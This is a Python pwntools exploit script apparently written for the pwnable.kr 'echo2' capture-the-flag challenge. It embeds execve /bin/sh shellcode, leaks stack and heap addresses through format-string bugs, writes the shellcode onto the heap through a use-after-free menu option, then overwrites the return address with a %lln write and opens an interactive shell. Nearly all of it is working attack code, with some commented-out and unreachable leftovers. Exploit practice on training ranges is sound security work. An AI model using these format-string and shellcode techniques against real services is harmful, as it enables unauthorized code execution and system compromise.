from pwn import *

host = 'pwnable.kr'
host = '0'
#conn = process('./echo2')
conn = connect(host, 9011)

nombre = 'physics'

"""
- 1. : BOF echo
- 2. : FSB echo
- 3. : UAF echo
- 4. : exit
"""
# http://shell-storm.org/shellcode/files/shellcode-603.php
shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

objo = 0x602098

def main():
	conn.recvuntil('name? : ')
	conn.sendline(nombre)
	conn.recvuntil('> ')

	# get ret addr on stack frame
	conn.sendline('2')
	conn.recvuntil(nombre)
	conn.sendline('%9$p')
	conn.recvline()
	line = conn.recvline()
	leak = int(line[2:], 16)
	print 'stack leak:' + hex(leak)
	ret_addr = leak - 224
	print 'main ret addr:' + hex(ret_addr)
	print ''
	conn.recvuntil('> ')

	# get shellcode addr
	conn.sendline('2')
	conn.recvuntil(nombre)
	payload = '%7$s    ' + p64(objo)
	conn.sendline( payload )
	conn.recvline()
	line = conn.recv(4)
	if line[-1] == '\x20':
		line = line[:-1] + '\x00'
	leak = line + '\x00' * 4
	leak = u64(leak)
	print 'heap leak:' + hex(leak)
	shellcode_addr = leak + 0x30
	if len(hex(shellcode_addr)) > 8:
		print 'shellcode addr too long...'
		return
	print 'shellcode addr:' + hex(shellcode_addr)
	print ''
	conn.recvuntil('> ')

	# place shellcode on heap
	conn.sendline('3')
	conn.sendline( shellcode )
	print 'shellcode written'
	print ''
	conn.recvuntil('> ')

	# overwrite ret addr
	sh_bytes = hex(shellcode_addr)[2:]
	b1 = (1, int(sh_bytes[0:2], 16))
	b2 = (2, int(sh_bytes[2:4], 16))
	b3 = (3, int(sh_bytes[4:6], 16))
	sh_bytes = [b1, b2, b3]
	sh_bytes.sort(key=lambda x: x[1])

	#pos:     6                   7                   8
	#payload = p64(ret_addr + 0) + p64(ret_addr + 1) + p64(ret_addr + 2)

	#num_print = sh_bytes[0][1]
	#payload += '%{:d}x%{:d}$n'.format(num_print, sh_bytes[0][0] + 5)
	#num_print = sh_bytes[1][1] - sh_bytes[0][1]
	#payload += '%{:d}x%{:d}$n'.format(num_print, sh_bytes[1][0] + 5)
	#num_print = sh_bytes[2][1] - sh_bytes[1][1]
	#payload += '%{:d}x%{:d}$n'.format(num_print, sh_bytes[2][0] + 5)

	conn.sendline('2')
	conn.recvuntil(nombre)
	payload = '%7$lln  '
	payload += p64(ret_addr)
	conn.sendline( payload ) # el payload no puede superar los 32 bytes...
	conn.interactive()
	return
	num_print = sh_bytes[0][1]
	payload += '%{:d}x%{:d}$n'.format(num_print, sh_bytes[0][0] + 5)

	payload += '%{:d}x%6$n'.format(100)#shellcode_addr)
	assert len(payload) <= 32



if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt as e:
		pass

#malloc = 0x017086a0
#leak   = 0x01708260
